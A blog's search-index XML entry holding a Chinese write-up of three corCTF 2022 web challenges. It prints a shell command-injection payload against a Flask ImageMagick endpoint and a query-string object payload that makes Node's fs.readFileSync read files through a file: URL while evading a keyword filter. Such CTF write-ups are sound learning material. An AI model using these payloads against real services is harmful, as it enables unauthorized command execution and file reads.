<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>corCTF-部分web</title>
      <link href="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/"/>
      <url>/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/</url>
      
        <content type="html"><![CDATA[<h1 id="corCTF-部分web记录"><a href="#corCTF-部分web记录" class="headerlink" title="corCTF 部分web记录"></a>corCTF 部分web记录</h1><h2 id="jsonquiz"><a href="#jsonquiz" class="headerlink" title="jsonquiz"></a>jsonquiz</h2><p>quiz.js</p><pre><code class="js">    setTimeout(() =&gt; {        let score = 0;        fetch("/submit", {            method: "POST",            headers: {                "Content-Type": "application/x-www-form-urlencoded"            },            body: "score=" + score        })        .then(r =&gt; r.json())        .then(j =&gt; {            if (j.pass) {                $("#reward").innerText = j.flag;                $("#pass").style.display = "block";            }            else {                $("#fail").style.display = "block";            }        });    }, 1250);</code></pre><p>直接请求就行</p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220808150155457.png" alt="image-20220808150155457"></p><h2 id="msfrog-generator"><a href="#msfrog-generator" class="headerlink" title="msfrog-generator"></a>msfrog-generator</h2><pre><code class="js">    let jsonData = [];    placedItems.forEach((item) =&gt; {      jsonData.push({ type: item.type, pos: item.pos });    });    try {      let response = await fetch("/api/generate", {        method: "POST",        headers: {          "Content-Type": "application/json",        },        body: JSON.stringify(jsonData),      });      if (response.status !== 200)        throw `Unexpected response: ${response.status}`;      response = await response.json();      if (!response.msfrog) throw "Empty response, the heck?";      toast.success("Enjoy your MsFrog :D");      triggerBase64Download(        `data:image/png;base64,${response.msfrog}`,        "msfrog"      );    } catch (e) {      toast.error(`Sadge, something went wrong: ${e}`);    }</code></pre><p>随便修改一点参数</p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220808150746039.png" alt="image-20220808150746039"></p><p>根据回显 感觉type处能够执行shell</p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220808151124578.png" alt="image-20220808151124578"></p><p>读取一下源码看看后端逻辑</p><pre><code class="python">import osimport jsonimport subprocessfrom flask import Flask, send_from_directory, requestapp = Flask(__name__, static_folder='fe')@app.route('/api/generate', methods=['POST'])def generate_msfrog():    # Check if we received JSON    if not request.is_json:        return "I only speak JSON :c", 400    # Grab all the msfrog accessoires    accessoires = None    try:        accessoires = request.get_json()    except:        return "nice json", 400    if not accessoires or not isinstance(accessoires, list):        return ":msfrog:", 400    composites = []    for accessoire in accessoires:        if 'type' not in accessoire:            return "missing type lmao", 400        type = accessoire['type']        pos = accessoire.get('pos', None)        if not pos or not isinstance(pos, dict):            return "Ehh I need the position to supply to imagemagick", 400        x = pos.get('x', None)        y = pos.get('y', None)        if not isinstance(type, str):            return "missing type lmao", 400        # Anti haxxor check        if not os.path.exists("./img/" + os.path.basename(type)):            return "I wont pass a non existing image to a shell command lol", 400        if x is None or y is None:            return "Ehh I need the position to supply to imagemagick", 400        composites.append(f"img/{type} -geometry +{x}+{y} -composite")    try:        result = subprocess.run(            f"convert img/base.png {' '.join(composites)} -trim png:- | base64 -w0", capture_output=True, shell=True)        if result.returncode != 0 or len(result.stdout) == 0:            return f"Something went wrong :\n{result.stderr}", 500        return json.dumps({"msfrog": result.stdout.decode('utf8')})    except:        return json.dumps({"msfrog": "error"})@ app.route('/')def serve_index():    return send_from_directory(app.static_folder, 'index.html')@ app.route('/&lt;path:path&gt;')def serve_react(path):    if path != "" and os.path.exists(app.static_folder + '/' + path):        return send_from_directory(app.static_folder, path)    else:        return "File not found", 404if __name__ == '__main__':    app.run(host='0.0.0.0', port=5000, threaded=True)</code></pre><p>根据代码 会产生命令注入的问题</p><p><code>convert img/base.png img/;whoami;/mstongue.png -geometry +157+128 -composite -trim png:- | base64 -w0</code></p><p>原理大体就是这样，然后<code>/mstongue.png</code>拼接回去<code>./img/mstongue.png</code></p><p>也能通过</p><pre><code class="python">        if not os.path.exists("./img/" + os.path.basename(type)):            return "I wont pass a non existing image to a shell command lol", 400</code></pre><h2 id="simple-waf"><a href="#simple-waf" class="headerlink" title="simple waf"></a>simple waf</h2><p>nodejs</p><pre><code class="js">const express = require("express");const fs = require("fs");const app = express();const PORT = process.env.PORT || 3456;app.use((req, res, next) =&gt; {    if([req.body, req.headers, req.query].some(        (item) =&gt; item &amp;&amp; JSON.stringify(item).includes("flag")    )) {        return res.send("bad hacker!");    }    next();});app.get("/", (req, res) =&gt; {    try {        res.setHeader("Content-Type", "text/html");        res.send(fs.readFileSync(req.query.file || "index.html").toString());           }    catch(err) {        console.log(err);        res.status(500).send("Internal server error");    }});app.listen(PORT, () =&gt; console.log(`web/simplewaf listening on port ${PORT}`));</code></pre><p>fs.readFileSync文件读取 绕过flag关键词</p><p>比赛期间没出</p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220808171731792.png" alt="image-20220808171731792"></p><p>可以看到readFileSync可以在URL类使用file协议</p><p>本地测试一下</p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220809123946637.png" alt="image-20220809123946637"></p><p>对URL类会自行urldecode一次，所以可以通过这个bypass关键词</p><p>然后问题来了 如何构造解析成URL类并且使用file协议解析呢</p><p>一步步调试可以看到验证了是否是url类</p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220808165220888.png" alt="image-20220808165220888"></p><p>去查看fs的源码（题目环境是v18.1.0，那就下载v18.x分支源码）</p><p><code>git clone -b v18.x https://github.com/nodejs/node.git</code></p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220809125911997.png" alt="image-20220809125911997"></p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220809125942940.png" alt="image-20220809125942940"></p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220809130010778.png" alt="image-20220809130010778"></p><ol><li><code>fileURLOrPath</code>不为null</li><li><code>href</code>属性不为空</li><li><code>origin</code>属性不为空</li></ol><p>check过了然后<code>return fileURLToPath(fileURLOrPath)</code></p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220809130215847.png" alt="image-20220809130215847"></p><ol start="4"><li><p><code>typeof path === 'string'</code></p></li><li><p><code>protocol === file:</code></p></li></ol><p>服务器为linux，所以会触发<code>getPathFromURLPosix</code></p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220809130441457.png" alt="image-20220809130441457"></p><ol start="6"><li><code>hostname === ''</code></li></ol><p>然后pathname则为文件名</p><p>此外最关键的是如何传参解析呢</p><p>?file[a]=b&amp;file[c]=d</p><p>在express的req.query.file下会变成{“a”: “b”, “c”: “d”}</p><p>所以我们只需要传参<code>?file[href]=x&amp;file[origin]=x&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=/app/fl%2561g.txt</code></p><p>两次url编码是因为在传参时会自解码一次:D) 可以在自己本地debug时候docker log很容易发现这件事</p><p><img src="/2022/08/09/corCTF-%E9%83%A8%E5%88%86web/image-20220809131535944.png" alt="image-20220809131535944"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
